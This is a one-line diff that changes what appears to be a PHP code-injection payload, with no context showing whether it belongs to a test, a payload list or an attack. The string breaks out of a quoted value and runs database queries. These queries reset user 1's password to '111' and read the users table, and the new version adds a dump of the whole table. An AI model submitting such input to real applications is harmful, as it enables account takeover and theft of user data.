@@ -1,1 +1,1 @@
-1"; $req = mysql_query("UPDATE users SET password='111' WHERE id='1'"); print "<br/>req = $req"; $req2 = mysql_query("SELECT * from users WHERE id='key'"); print "<br/>key = $req2"; 
+1\"; $req3 = mysql_query("SELECT * from users"); print "<br/>req3 = $req3"; $req = mysql_query("UPDATE users SET password='111' WHERE id='1'"); print "<br/>req = $req"; $req2 = mysql_query("SELECT * from users WHERE id='key'"); print "<br/>key = $req2"; 
